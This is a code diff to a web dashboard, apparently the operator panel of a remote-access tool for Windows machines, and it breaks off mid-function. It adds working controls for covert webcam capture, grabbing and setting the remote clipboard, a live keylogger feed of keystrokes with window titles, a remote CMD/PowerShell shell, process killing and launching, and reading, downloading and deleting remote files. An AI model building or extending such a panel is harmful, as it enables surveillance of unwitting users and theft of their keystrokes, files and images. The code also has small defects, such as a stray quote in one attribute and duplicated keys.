@@ -381,6 +381,14 @@ tailwind.config = {
       <div class="rail-tooltip">Notifications</div>
       <div class="notif-dot" id="notif-dot" style="display:none"></div>
     </div>
+    <div class="rail-item" id="rail-system" onclick="showSection('system')">
+      <span class="material-symbols-outlined">monitoring</span>
+      <div class="rail-tooltip">System Monitor</div>
+    </div>
+    <div class="rail-item" id="rail-processes" onclick="showSection('processes')">
+      <span class="material-symbols-outlined">terminal</span>
+      <div class="rail-tooltip">Shell &amp; Processes</div>
+    </div>
     <div class="rail-item" id="rail-settings" onclick="showSection('settings')">
       <span class="material-symbols-outlined">settings</span>
       <div class="rail-tooltip">Settings</div>
@@ -592,6 +600,8 @@ tailwind.config = {
         <div style="flex:1"></div>
         <div style="font-size:11px;color:var(--text-3)" id="rv-fps-label"></div>
         <button class="tbtn" onclick="cycleQuality()"><span class="material-symbols-outlined">hd</span><span id="rv-quality-lbl">High</span></button>
+        <button class="tbtn" id="rv-mode-btn" onclick="toggleStreamMode()"><span class="material-symbols-outlined">videocam</span><span id="rv-mode-lbl">Video</span></button>
+        <div style="font-size:10px;color:var(--text-3);padding:0 4px" id="rv-lat-lbl"></div>
         <button class="tbtn" onclick="requestFullscreen()"><span class="material-symbols-outlined">fullscreen</span></button>
         <button class="tbtn" id="rv-input-btn" onclick="toggleInput()"><span class="material-symbols-outlined">mouse</span><span id="rv-input-lbl">Input On</span></button>
         <button class="tbtn" onclick="sendCtrlAltDel()"><span class="material-symbols-outlined">keyboard</span>Ctrl+Alt+Del</button>
@@ -605,6 +615,7 @@ tailwind.config = {
           <div style="font-size:12px">Click <b style="color:var(--teal)">Connect</b> on an online machine to start</div>
           <button class="btn btn-s" onclick="showSection('access')"><span class="material-symbols-outlined">arrow_back</span>Go to Machines</button>
         </div>
+        <canvas id="rv-cursor-overlay" style="display:none;position:absolute;top:0;left:0;pointer-events:none;z-index:10"></canvas>
         <canvas id="rv-canvas" style="display:none;max-width:100%;max-height:100%;cursor:crosshair"
           onmousedown="rvMouse(event,'down')" onmouseup="rvMouse(event,'up')" onmousemove="rvMouse(event,'move')"
           oncontextmenu="rvMouse(event,'rclick');return false;" ondblclick="rvMouse(event,'dblclick')" onwheel="rvScroll(event)"></canvas>
@@ -628,18 +639,26 @@ tailwind.config = {
           <div class="sec-title">File Manager</div>
           <div class="sec-sub" id="file-sub">Connect a machine to browse remote files</div>
         </div>
+        <div class="sec-actions">
+          <select class="sinput" id="file-device-sel" onchange="fileSelectDevice(this.value)" style="min-width:180px;padding:6px 10px">
+            <option value="">— Select Device —</option>
+          </select>
+          <input id="file-path-input" class="finput" placeholder="C:\" style="width:200px" onkeydown="if(event.key==='Enter')fileBrowse()"/>
+          <button class="btn btn-p" onclick="fileBrowse()"><span class="material-symbols-outlined">folder_open</span>Browse</button>
+          <button class="btn btn-s" onclick="fileDrives()"><span class="material-symbols-outlined">hard_drive</span>Drives</button>
+        </div>
         <button class="btn btn-s" onclick="showToast('File uploads activate when a machine is online','info')"><span class="material-symbols-outlined">upload</span>Upload</button>
       </div>
       <div class="fbrow">
         <div class="ftree">
-          <div class="ftree-item active" onclick="selDir(this,'Root')"><span class="material-symbols-outlined">folder</span>Root</div>
+          <div class="ftree-item active" id="ftree-drives" onclick="fileDrives()">"><span class="material-symbols-outlined">folder</span>Root</div>
           <div class="ftree-item" onclick="selDir(this,'Documents')"><span class="material-symbols-outlined">description</span>Documents</div>
           <div class="ftree-item" onclick="selDir(this,'Media')"><span class="material-symbols-outlined">perm_media</span>Media</div>
           <div class="ftree-item" onclick="selDir(this,'Logs')"><span class="material-symbols-outlined">receipt_long</span>Logs</div>
         </div>
         <div class="fcontent">
           <table class="ftable">
-            <thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th></th></tr></thead>
+            <thead><tr><th>Name</th><th>Type</th><th>Size KB</th><th>Modified</th><th>Actions</th></tr></thead>
             <tbody id="ftbody">
               <tr><td colspan="5" style="padding:24px;color:var(--text-3)">No files yet. Connect a machine to browse.</td></tr>
             </tbody>
@@ -723,6 +742,176 @@ tailwind.config = {
         <div class="srow">
           <div><div class="skey">Sign Out</div></div>
           <button class="btn btn-d" onclick="doLogout()">Sign Out</button>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ══ SYSTEM MONITOR ══ -->
+    <section class="dash-section" id="section-system">
+      <div class="sec-header">
+        <div>
+          <div class="sec-title">System Monitor</div>
+          <div class="sec-sub" id="sys-sub">Select an online device to view live system stats</div>
+        </div>
+        <div class="sec-actions">
+          <select class="sinput" id="sys-device-sel" onchange="sysSelectDevice(this.value)" style="min-width:180px;padding:6px 10px">
+            <option value="">— Select Device —</option>
+          </select>
+          <button class="btn btn-p" onclick="sysStartMonitor()"><span class="material-symbols-outlined">play_arrow</span>Start</button>
+          <button class="btn btn-s" onclick="sysStopMonitor()"><span class="material-symbols-outlined">stop</span>Stop</button>
+          <button class="btn btn-s" onclick="sysSnapshot()"><span class="material-symbols-outlined">camera</span>Snapshot</button>
+        </div>
+      </div>
+      <!-- KPI row -->
+      <div class="kpi-grid">
+        <div class="kpi">
+          <div class="kpi-top"><span class="kpi-label">CPU</span><span class="material-symbols-outlined kpi-ico teal">memory</span></div>
+          <div class="kpi-val" id="sys-cpu">—</div>
+          <div class="kpi-sub" id="sys-cpu-freq">—</div>
+        </div>
+        <div class="kpi">
+          <div class="kpi-top"><span class="kpi-label">RAM</span><span class="material-symbols-outlined kpi-ico green">storage</span></div>
+          <div class="kpi-val" id="sys-ram">—</div>
+          <div class="kpi-sub" id="sys-ram-detail">—</div>
+        </div>
+        <div class="kpi">
+          <div class="kpi-top"><span class="kpi-label">Disk</span><span class="material-symbols-outlined kpi-ico orange">hard_drive</span></div>
+          <div class="kpi-val" id="sys-disk">—</div>
+          <div class="kpi-sub" id="sys-disk-detail">—</div>
+        </div>
+        <div class="kpi">
+          <div class="kpi-top"><span class="kpi-label">Network</span><span class="material-symbols-outlined kpi-ico">wifi</span></div>
+          <div class="kpi-val" id="sys-net-sent">—</div>
+          <div class="kpi-sub" id="sys-net-recv">—</div>
+        </div>
+      </div>
+      <!-- Battery + uptime row -->
+      <div class="sc-grid" style="margin-bottom:16px">
+        <div class="sc-card">
+          <div class="sc-card-left">
+            <div class="sc-icon teal"><span class="material-symbols-outlined">battery_charging_full</span></div>
+            <div><div class="sc-card-title">Battery</div><div class="sc-card-sub" id="sys-battery">—</div></div>
+          </div>
+        </div>
+        <div class="sc-card">
+          <div class="sc-card-left">
+            <div class="sc-icon green"><span class="material-symbols-outlined">schedule</span></div>
+            <div><div class="sc-card-title">Uptime</div><div class="sc-card-sub" id="sys-uptime">—</div></div>
+          </div>
+        </div>
+      </div>
+      <!-- Per-core CPU + Temps -->
+      <div class="panel">
+        <div class="panel-hdr"><div class="panel-title"><span class="material-symbols-outlined">developer_board</span>Per-Core CPU &amp; Temperatures</div></div>
+        <div style="padding:14px" id="sys-cores-wrap"><div style="color:var(--text-3);font-size:13px">No data yet — start monitoring</div></div>
+      </div>
+      <!-- Webcam section -->
+      <div class="panel">
+        <div class="panel-hdr">
+          <div class="panel-title"><span class="material-symbols-outlined">videocam</span>Webcam</div>
+          <div style="display:flex;gap:8px">
+            <select class="sinput" id="webcam-cam-sel" style="padding:4px 8px;font-size:12px"><option value="0">Camera 0</option></select>
+            <button class="tbtn p" onclick="captureWebcam()"><span class="material-symbols-outlined">camera</span>Capture</button>
+            <button class="tbtn" onclick="listWebcams()"><span class="material-symbols-outlined">refresh</span>List</button>
+          </div>
+        </div>
+        <div style="padding:14px;display:flex;gap:16px;align-items:flex-start;flex-wrap:wrap">
+          <img id="webcam-img" src="" style="display:none;max-width:320px;border-radius:8px;border:1px solid var(--border)" alt="Webcam"/>
+          <div id="webcam-placeholder" style="color:var(--text-3);font-size:13px;padding:24px">Click Capture to take a snapshot from the remote webcam.</div>
+        </div>
+      </div>
+      <!-- Clipboard -->
+      <div class="panel">
+        <div class="panel-hdr">
+          <div class="panel-title"><span class="material-symbols-outlined">content_paste</span>Clipboard</div>
+          <div style="display:flex;gap:8px">
+            <button class="tbtn p" onclick="clipboardGet()"><span class="material-symbols-outlined">download</span>Get</button>
+            <button class="tbtn" onclick="clipboardSet()"><span class="material-symbols-outlined">upload</span>Set</button>
+          </div>
+        </div>
+        <div style="padding:14px">
+          <textarea id="clipboard-txt" style="width:100%;min-height:80px;background:var(--bg-3);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text-1);font-family:var(--mono);font-size:12px;outline:none;resize:vertical" placeholder="Remote clipboard content appears here. Click Get to fetch, or type and click Set to push."></textarea>
+        </div>
+      </div>
+      <!-- Keylog -->
+      <div class="panel">
+        <div class="panel-hdr">
+          <div class="panel-title"><span class="material-symbols-outlined">keyboard</span>Keylogger Stream</div>
+          <button class="tbtn del" onclick="document.getElementById('keylog-txt').value=''">Clear</button>
+        </div>
+        <div style="padding:14px">
+          <textarea id="keylog-txt" readonly style="width:100%;min-height:120px;background:#0a0a0a;border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--green);font-family:var(--mono);font-size:12px;outline:none;resize:vertical" placeholder="Keystrokes from the remote device will appear here in real time…"></textarea>
+        </div>
+      </div>
+      <!-- Power commands -->
+      <div class="panel">
+        <div class="panel-hdr"><div class="panel-title"><span class="material-symbols-outlined">power_settings_new</span>Power &amp; Control</div></div>
+        <div style="padding:14px;display:flex;gap:10px;flex-wrap:wrap">
+          <button class="btn btn-s" onclick="sendPower('lock_screen')"><span class="material-symbols-outlined">lock</span>Lock Screen</button>
+          <button class="btn btn-s" onclick="sendPower('sleep')"><span class="material-symbols-outlined">bedtime</span>Sleep</button>
+          <button class="btn btn-d" onclick="confirmPower('shutdown','Shut Down')"><span class="material-symbols-outlined">power_off</span>Shutdown</button>
+          <button class="btn btn-d" onclick="confirmPower('restart','Restart')"><span class="material-symbols-outlined">restart_alt</span>Restart</button>
+          <button class="btn btn-s" onclick="sendPower('abort_shutdown')"><span class="material-symbols-outlined">cancel</span>Abort Shutdown</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══ PROCESSES & SHELL ══ -->
+    <section class="dash-section" id="section-processes">
+      <div class="sec-header">
+        <div>
+          <div class="sec-title">Processes &amp; Shell</div>
+          <div class="sec-sub" id="proc-sub">Select an online device</div>
+        </div>
+        <div class="sec-actions">
+          <select class="sinput" id="proc-device-sel" onchange="procSelectDevice(this.value)" style="min-width:180px;padding:6px 10px">
+            <option value="">— Select Device —</option>
+          </select>
+          <button class="btn btn-p" onclick="listProcs()"><span class="material-symbols-outlined">refresh</span>Refresh Processes</button>
+        </div>
+      </div>
+
+      <!-- Shell -->
+      <div class="panel" style="margin-bottom:16px">
+        <div class="panel-hdr">
+          <div class="panel-title"><span class="material-symbols-outlined">terminal</span>Remote Shell</div>
+          <div style="display:flex;gap:8px;align-items:center">
+            <select class="sinput" id="shell-type" style="padding:4px 8px;font-size:12px">
+              <option value="cmd">CMD</option>
+              <option value="powershell">PowerShell</option>
+            </select>
+            <button class="tbtn del" onclick="document.getElementById('shell-out').textContent=''">Clear</button>
+          </div>
+        </div>
+        <div style="padding:12px">
+          <div id="shell-out" style="min-height:140px;max-height:300px;overflow-y:auto;background:#0a0a0a;border:1px solid var(--border);border-radius:6px;padding:12px;font-family:var(--mono);font-size:12px;color:var(--green);white-space:pre-wrap;margin-bottom:10px">
+<span style="color:var(--text-3)">Remote shell output appears here…</span>
+          </div>
+          <div style="display:flex;gap:8px">
+            <input id="shell-input" class="finput" placeholder="Enter command… e.g. ipconfig, dir C:\, Get-Process" style="font-family:var(--mono)"
+              onkeydown="if(event.key==='Enter')runShell()"/>
+            <button class="btn btn-p" onclick="runShell()" style="flex-shrink:0"><span class="material-symbols-outlined">send</span>Run</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Process List -->
+      <div class="panel">
+        <div class="panel-hdr">
+          <div class="panel-title"><span class="material-symbols-outlined">apps</span>Running Processes <span class="badge pending" id="proc-count" style="margin-left:4px">0</span></div>
+          <div style="display:flex;gap:8px">
+            <input id="proc-search" class="finput" placeholder="Filter…" style="width:160px" oninput="filterProcs(this.value)"/>
+            <button class="tbtn" onclick="showStartProcDlg()"><span class="material-symbols-outlined">add</span>Start</button>
+          </div>
+        </div>
+        <div style="overflow-x:auto;max-height:400px;overflow-y:auto">
+          <table class="mtable" id="proc-table">
+            <thead><tr>
+              <th>PID</th><th>Name</th><th>Status</th><th>CPU%</th><th>RAM MB</th><th>User</th><th>Started</th><th></th>
+            </tr></thead>
+            <tbody id="proc-tbody"><tr><td colspan="8" style="padding:20px;color:var(--text-3)">No processes — click Refresh Processes</td></tr></tbody>
+          </table>
         </div>
       </div>
     </section>
@@ -969,7 +1158,90 @@ function connectSocket() {
     SC.socket.on('frame',           d => displayRemoteFrame(d));
     SC.socket.on('stream_to_dash',  d => displayRemoteFrame(d));
     SC.socket.on('pong_agent', d => {
-      if (d.device_id===RV.deviceId) RV.latency = Date.now()-RV.pingSent;
+      if (d.device_id===RV.deviceId) {
+        RV.latency = Date.now()-RV.pingSent;
+        const ll = el('rv-lat-lbl'); if(ll) ll.textContent = RV.latency+'ms';
+      }
+    });
+    SC.socket.on('cursor_event', d => {
+      if (d.device_id===RV.deviceId) drawCursorOverlay(d.x, d.y, d.type==='click');
+    });
+    SC.socket.on('update_system_tab', d => updateSysTab(d));
+    SC.socket.on('heartbeat_update', d => {
+      const did = d.device_id;
+      const s = screens.find(sc => sc.token===did); if(!s) return;
+      // update kpis inline if system section is active
+      if (document.getElementById('section-system')?.classList.contains('active')) {
+        if (did === _sysDeviceId) updateSysHeartbeat(d);
+      }
+    });
+    SC.socket.on('processes_result', d => renderProcs(d.processes||[]));
+    SC.socket.on('kill_result', d => {
+      showToast(d.message||(d.success?'Process killed':'Kill failed'), d.success?'success':'error');
+      listProcs();
+    });
+    SC.socket.on('start_process_result', d => showToast(d.message||(d.success?'Started':'Failed'), d.success?'success':'error'));
+    SC.socket.on('shell_result', d => {
+      const out = document.getElementById('shell-out');
+      if (!out) return;
+      const cmd = escHtml(d.command||'');
+      const stdout = escHtml((d.stdout||'').trim());
+      const stderr = escHtml((d.stderr||'').trim());
+      const rc = d.returncode !== undefined ? ` [rc:${d.returncode}]` : '';
+      const ts = d.elapsed_s !== undefined ? ` ${d.elapsed_s}s` : '';
+      out.innerHTML += `\n<span style="color:var(--teal)">❯ ${cmd}</span>${rc}${ts}\n${stdout}${stderr?'\n<span style="color:var(--red)">'+stderr+'</span>':''}\n`;
+      out.scrollTop = out.scrollHeight;
+    });
+    SC.socket.on('file_list_result', d => renderFileList(d));
+    SC.socket.on('file_read_result', d => {
+      if (d.error) { showToast('Read error: '+d.error,'error'); return; }
+      const dlg = window.open('','_blank');
+      dlg.document.write('<pre style="font-family:monospace;white-space:pre-wrap">'+escHtml(d.content)+'</pre>');
+    });
+    SC.socket.on('file_download_result', d => {
+      if (d.error) { showToast('Download error: '+d.error,'error'); return; }
+      const a = document.createElement('a');
+      a.href = 'data:application/octet-stream;base64,'+d.data;
+      a.download = d.filename||'file';
+      a.click();
+      showToast('Downloaded: '+d.filename,'success');
+    });
+    SC.socket.on('file_delete_result', d => {
+      showToast(d.message||(d.success?'Deleted':'Delete failed'), d.success?'success':'error');
+      fileBrowse();
+    });
+    SC.socket.on('drives_report', d => renderDrives(d.drives||[]));
+    SC.socket.on('webcam_result', d => {
+      if (d.error) { showToast('Webcam: '+d.error,'error'); return; }
+      const img = document.getElementById('webcam-img');
+      const ph = document.getElementById('webcam-placeholder');
+      if (img) {
+        img.src = 'data:image/jpeg;base64,'+d.frame;
+        img.style.display = 'block';
+        if (ph) ph.style.display = 'none';
+      }
+      showToast('Webcam captured','success');
+    });
+    SC.socket.on('webcam_list_result', d => {
+      const sel = document.getElementById('webcam-cam-sel'); if(!sel) return;
+      sel.innerHTML = (d.cameras||[]).map(c=>`<option value="${c.index}">${c.name}</option>`).join('');
+    });
+    SC.socket.on('clipboard_data', d => {
+      const t = document.getElementById('clipboard-txt'); if(t) t.value = d.content||'';
+    });
+    SC.socket.on('clipboard_result', d => {
+      const t = document.getElementById('clipboard-txt'); if(t) t.value = d.content||'';
+      showToast('Clipboard fetched','success');
+    });
+    SC.socket.on('keylog_data', d => {
+      const t = document.getElementById('keylog-txt'); if(!t) return;
+      const win = d.window ? `[${d.window}] ` : '';
+      t.value += win + (d.text||'');
+      t.scrollTop = t.scrollHeight;
+      addLog('Keylog: '+escHtml((d.text||'').slice(0,40)), d.device_id||'Agent', 'Agent', 'info');
+    });
+    SC.socket.on('action_result', d => {
+      showToast((d.action||'Action')+': '+(d.success?'OK':'Failed'), d.success?'success':'error');
     });
   } catch(e) { console.warn('Socket N/A'); }
 }
@@ -1650,7 +1922,14 @@ function filterScreens(q) {
 
 /* ══ UI helpers ══ */
 const sectionLabels = {
+  'system': 'System Monitor',
+  'processes': 'Processes & Shell',
   'access': 'Access',
+  'remote-view': 'Remote View',
+  'file-explorer': 'File Manager',
+  'activity-logs': 'Activity Log',
+  'supabase-view': 'Database',
+  'settings': 'Administration',
   'remote-view': 'Remote View',
   'file-explorer': 'File Manager',
   'activity-logs': 'Activity Log',
@@ -1668,9 +1947,9 @@ function showSection(id) {
   const s = document.getElementById(`section-${id}`);
   if (s) {
     s.classList.add('active');
-    s.style.display = id === 'remote-view' ? 'flex' : 'block';
+    s.style.display = (id === 'remote-view') ? 'flex' : (id === 'system' || id === 'processes') ? 'block' : 'block';
   }
-  const navMap = { 'access': ['nav-all'], 'remote-view': [], 'file-explorer': [], 'activity-logs': [], 'supabase-view': [], 'settings': [] };
+  const navMap = { 'access': ['nav-all'], 'remote-view': [], 'file-explorer': [], 'activity-logs': [], 'supabase-view': [], 'settings': [], 'system': [], 'processes': [] };
   (navMap[id]||[]).forEach(nid => { const el = document.getElementById(nid); if(el) el.classList.add('active'); });
   const railEl = document.getElementById(`rail-${id}`);
   if (railEl) railEl.classList.add('active');
@@ -1720,6 +1999,321 @@ function escHtml(str) {
 }
 
 /* ══ Init ══ */
+
+/* ══════════════════════════════════════════════════════
+   NEW FEATURE JS — System, Processes, Shell, Files, etc
+   ══════════════════════════════════════════════════════ */
+
+/* ── Active device selectors ── */
+let _sysDeviceId   = null;
+let _procDeviceId  = null;
+let _fileDeviceId  = null;
+let _procList      = [];
+
+function _populateDeviceSelects() {
+  const onlineScreens = screens.filter(s => s.status === 'online');
+  ['sys-device-sel','proc-device-sel','file-device-sel'].forEach(id => {
+    const sel = document.getElementById(id); if (!sel) return;
+    const cur = sel.value;
+    sel.innerHTML = '<option value="">— Select Device —</option>' +
+      onlineScreens.map(s => `<option value="${escHtml(s.token)}">${escHtml(s.name)}</option>`).join('');
+    if (cur) sel.value = cur;
+  });
+}
+
+/* ── System Monitor ── */
+function sysSelectDevice(did) {
+  _sysDeviceId = did;
+  const sub = document.getElementById('sys-sub');
+  const sc = screens.find(s => s.token===did);
+  if (sub && sc) sub.textContent = `Monitoring: ${sc.name} · ${sc.ip||''}`;
+}
+function sysStartMonitor() {
+  if (!_sysDeviceId) { showToast('Select a device first','error'); return; }
+  if (!SC.socket) { showToast('No server connection','error'); return; }
+  SC.socket.emit('start_sysmon', { device_id: _sysDeviceId, interval: 2 });
+  showToast('System monitoring started','success');
+  addLog('System monitor started', _sysDeviceId, 'Admin', 'ok');
+}
+function sysStopMonitor() {
+  if (!_sysDeviceId || !SC.socket) return;
+  SC.socket.emit('stop_sysmon', { device_id: _sysDeviceId });
+  showToast('Monitoring stopped','info');
+}
+function sysSnapshot() {
+  if (!_sysDeviceId) { showToast('Select a device first','error'); return; }
+  if (!SC.socket) { showToast('No server connection','error'); return; }
+  SC.socket.emit('request_snapshot', { device_id: _sysDeviceId });
+}
+
+function updateSysTab(d) {
+  if (_sysDeviceId && d.device_id !== _sysDeviceId) return;
+  const set = (id, v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
+  set('sys-cpu', (d.cpu_percent||0).toFixed(1)+'%');
+  set('sys-cpu-freq', (d.cpu_freq_mhz||0)+' MHz · '+d.cpu_count+' cores');
+  set('sys-ram', (d.ram_percent||0).toFixed(1)+'%');
+  set('sys-ram-detail', `${d.ram_used_gb||0} / ${d.ram_total_gb||0} GB`);
+  set('sys-disk', (d.disk_percent||0).toFixed(1)+'%');
+  set('sys-disk-detail', `${d.disk_used_gb||0} / ${d.disk_total_gb||0} GB`);
+  set('sys-net-sent', '↑ '+(d.net_sent_mb||0).toFixed(1)+' MB');
+  set('sys-net-recv', '↓ '+(d.net_recv_mb||0).toFixed(1)+' MB');
+  const bat = d.battery_pct;
+  set('sys-battery', bat!=null ? `${bat.toFixed(0)}% ${d.battery_plug?'(charging)':''}` : 'N/A');
+  set('sys-uptime', d.uptime_hrs!=null ? d.uptime_hrs.toFixed(1)+' hrs' : '—');
+  // Per-core bars
+  if (Array.isArray(d.cpu_per_core)) {
+    const wrap = document.getElementById('sys-cores-wrap'); if (!wrap) return;
+    wrap.innerHTML = `<div style="display:flex;flex-wrap:wrap;gap:8px;">` +
+      d.cpu_per_core.map((pct,i) => `
+        <div style="width:60px;text-align:center">
+          <div style="font-size:10px;color:var(--text-3);margin-bottom:4px">C${i}</div>
+          <div style="height:48px;background:var(--bg-4);border-radius:4px;position:relative;overflow:hidden">
+            <div style="position:absolute;bottom:0;left:0;right:0;background:var(--teal);opacity:0.7;height:${pct}%;transition:height .4s"></div>
+          </div>
+          <div style="font-size:10px;color:var(--text-2);margin-top:3px">${pct.toFixed(0)}%</div>
+        </div>`).join('') + `</div>`;
+    if (d.temperatures && Object.keys(d.temperatures).length) {
+      wrap.innerHTML += `<div style="margin-top:12px;font-size:11px;color:var(--text-3);font-weight:700;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px">Temperatures</div><div style="display:flex;flex-wrap:wrap;gap:8px">` +
+        Object.entries(d.temperatures).map(([k,v]) =>
+          `<div style="background:var(--bg-3);border:1px solid var(--border);border-radius:6px;padding:6px 10px;font-size:11px"><div style="color:var(--text-3);margin-bottom:2px">${escHtml(k)}</div><div style="font-weight:700;color:${v>80?'var(--red)':v>60?'var(--orange)':'var(--green)'}">${v}°C</div></div>`
+        ).join('') + '</div>';
+    }
+  }
+}
+
+function updateSysHeartbeat(d) {
+  const set = (id, v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
+  if (d.cpu != null) set('sys-cpu', d.cpu.toFixed(1)+'%');
+  if (d.ram != null) set('sys-ram', d.ram.toFixed(1)+'%');
+}
+
+/* ── Webcam ── */
+function captureWebcam() {
+  const did = _sysDeviceId; if (!did) { showToast('Select a device in System Monitor','error'); return; }
+  if (!SC.socket) return;
+  const cam = parseInt(document.getElementById('webcam-cam-sel')?.value||'0');
+  SC.socket.emit('webcam_capture', { device_id: did, camera: cam });
+  showToast('Capturing webcam…','info');
+}
+function listWebcams() {
+  const did = _sysDeviceId; if (!did) { showToast('Select a device in System Monitor','error'); return; }
+  if (!SC.socket) return;
+  SC.socket.emit('webcam_list', { device_id: did });
+}
+
+/* ── Clipboard ── */
+function clipboardGet() {
+  const did = _sysDeviceId; if (!did) { showToast('Select a device','error'); return; }
+  if (!SC.socket) return;
+  SC.socket.emit('clipboard_get', { device_id: did });
+}
+function clipboardSet() {
+  const did = _sysDeviceId; if (!did) { showToast('Select a device','error'); return; }
+  const txt = document.getElementById('clipboard-txt')?.value||'';
+  if (!SC.socket) return;
+  SC.socket.emit('clipboard_set', { device_id: did, text: txt });
+  showToast('Clipboard set on remote device','success');
+}
+
+/* ── Power ── */
+function sendPower(cmd) {
+  const did = _sysDeviceId; if (!did) { showToast('Select a device in System Monitor','error'); return; }
+  if (!SC.socket) return;
+  SC.socket.emit('power_command', { device_id: did, command: cmd });
+  showToast('Power command: '+cmd, 'info');
+  addLog('Power: '+cmd, did, 'Admin', 'warn');
+}
+function confirmPower(cmd, label) {
+  if (!confirm('Send "'+label+'" to remote device? This will affect the machine.')) return;
+  sendPower(cmd);
+}
+
+/* ── Processes ── */
+function procSelectDevice(did) {
+  _procDeviceId = did;
+  const sc = screens.find(s => s.token===did);
+  const sub = document.getElementById('proc-sub'); if(sub && sc) sub.textContent = 'Device: '+sc.name;
+}
+function listProcs() {
+  const did = _procDeviceId; if (!did) { showToast('Select a device','error'); return; }
+  if (!SC.socket) return;
+  SC.socket.emit('list_processes', { device_id: did });
+}
+function filterProcs(q) {
+  const list = q ? _procList.filter(p => String(p.name||'').toLowerCase().includes(q.toLowerCase())) : _procList;
+  renderProcRows(list);
+}
+function renderProcs(procs) {
+  _procList = procs;
+  const cnt = document.getElementById('proc-count'); if(cnt) cnt.textContent = procs.length;
+  renderProcRows(procs);
+}
+function renderProcRows(procs) {
+  const tbody = document.getElementById('proc-tbody'); if(!tbody) return;
+  if (!procs.length) { tbody.innerHTML='<tr><td colspan="8" style="padding:16px;color:var(--text-3)">No processes</td></tr>'; return; }
+  tbody.innerHTML = procs.slice(0,200).map(p => `<tr>
+    <td style="font-family:var(--mono);font-size:11px">${p.pid}</td>
+    <td><div class="mname" style="font-size:12px">${escHtml(p.name||'—')}</div></td>
+    <td><span class="badge ${p.status==='running'?'online':'offline'}">${escHtml(p.status||'—')}</span></td>
+    <td style="font-family:var(--mono);color:${(p.cpu_percent||0)>50?'var(--red)':'var(--text-2)'}">${(p.cpu_percent||0).toFixed(1)}%</td>
+    <td style="font-family:var(--mono)">${(p.memory_mb||0).toFixed(1)}</td>
+    <td style="font-size:11px;color:var(--text-3)">${escHtml(p.username||'—')}</td>
+    <td style="font-size:10px;color:var(--text-3)">${p.create_time?p.create_time.slice(0,16):'—'}</td>
+    <td><button class="tbtn del" onclick="killProc(${p.pid})" title="Kill"><span class="material-symbols-outlined">close</span></button></td>
+  </tr>`).join('');
+}
+function killProc(pid) {
+  if (!_procDeviceId || !SC.socket) return;
+  if (!confirm('Kill PID '+pid+'?')) return;
+  SC.socket.emit('kill_process', { device_id: _procDeviceId, pid });
+}
+function showStartProcDlg() {
+  const cmd = prompt('Start process (command):'); if (!cmd) return;
+  if (!_procDeviceId || !SC.socket) { showToast('Select a device','error'); return; }
+  SC.socket.emit('start_process', { device_id: _procDeviceId, command: cmd });
+  showToast('Start process sent: '+cmd, 'info');
+}
+
+/* ── Shell ── */
+function runShell() {
+  const did = _procDeviceId; if (!did) { showToast('Select a device in Processes tab','error'); return; }
+  const input = document.getElementById('shell-input'); if (!input) return;
+  const cmd = input.value.trim(); if (!cmd) return;
+  const shellType = document.getElementById('shell-type')?.value||'cmd';
+  if (!SC.socket) { showToast('No connection','error'); return; }
+  SC.socket.emit('shell_command', { device_id: did, command: cmd, shell_type: shellType });
+  input.value = '';
+}
+
+/* ── File Browser ── */
+function fileSelectDevice(did) {
+  _fileDeviceId = did;
+  if (did) { document.getElementById('file-path-input').value = 'C:\\'; fileDrives(); }
+}
+function fileBrowse() {
+  const did = _fileDeviceId; if (!did) { showToast('Select a device','error'); return; }
+  const path = document.getElementById('file-path-input')?.value||'C:\\';
+  if (!SC.socket) return;
+  SC.socket.emit('file_list', { device_id: did, path });
+  const sub = document.getElementById('file-sub'); if(sub) sub.textContent = path;
+}
+function fileDrives() {
+  const did = _fileDeviceId; if (!did) { showToast('Select a device','error'); return; }
+  if (!SC.socket) return;
+  SC.socket.emit('list_drives', { device_id: did });
+}
+function renderFileList(d) {
+  if (d.error) { showToast('File error: '+d.error,'error'); return; }
+  const tbody = document.getElementById('ftbody'); if(!tbody) return;
+  const entries = d.entries||[];
+  if (!entries.length) { tbody.innerHTML='<tr><td colspan="5" style="padding:16px;color:var(--text-3)">Empty directory</td></tr>'; return; }
+  tbody.innerHTML = entries.map(e => `<tr>
+    <td>
+      <div style="display:flex;align-items:center;gap:6px;cursor:pointer" onclick="fileNavTo('${escHtml(e.path).replace(/'/g,"\\'")}','${e.type}')">
+        <span class="material-symbols-outlined" style="font-size:16px;color:${e.type==='dir'?'var(--teal)':'var(--text-3)'}">${e.type==='dir'?'folder':'description'}</span>
+        <span style="font-size:12px;font-weight:${e.type==='dir'?'600':'400'};color:var(--text-1)">${escHtml(e.name)}</span>
+      </div>
+    </td>
+    <td><span style="font-size:10px;color:var(--text-3)">${e.type}</span></td>
+    <td style="font-family:var(--mono);font-size:11px;color:var(--text-3)">${e.size_kb!=null?e.size_kb+' KB':'—'}</td>
+    <td style="font-size:10px;color:var(--text-3)">${e.modified?e.modified.slice(0,16):'—'}</td>
+    <td>
+      ${e.type==='file'?`
+        <div class="abtns">
+          <button class="tbtn" onclick="fileDownload('${escHtml(e.path).replace(/'/g,"\\'")}')"><span class="material-symbols-outlined">download</span></button>
+          <button class="tbtn" onclick="fileRead('${escHtml(e.path).replace(/'/g,"\\'")}')"><span class="material-symbols-outlined">visibility</span></button>
+          <button class="tbtn del" onclick="fileDelete('${escHtml(e.path).replace(/'/g,"\\'")}')"><span class="material-symbols-outlined">delete</span></button>
+        </div>`:''}
+    </td>
+  </tr>`).join('');
+  const pathInput = document.getElementById('file-path-input'); if(pathInput && d.path) pathInput.value = d.path;
+  const sub = document.getElementById('file-sub'); if(sub) sub.textContent = d.path||'';
+}
+function fileNavTo(path, type) {
+  if (type === 'dir') {
+    const input = document.getElementById('file-path-input'); if(input) input.value = path;
+    if (_fileDeviceId && SC.socket) SC.socket.emit('file_list', { device_id: _fileDeviceId, path });
+  }
+}
+function fileDownload(path) {
+  if (!_fileDeviceId || !SC.socket) return;
+  SC.socket.emit('file_download', { device_id: _fileDeviceId, path });
+  showToast('Downloading…', 'info');
+}
+function fileRead(path) {
+  if (!_fileDeviceId || !SC.socket) return;
+  SC.socket.emit('file_read', { device_id: _fileDeviceId, path });
+}
+function fileDelete(path) {
+  if (!confirm('Delete: '+path+'?')) return;
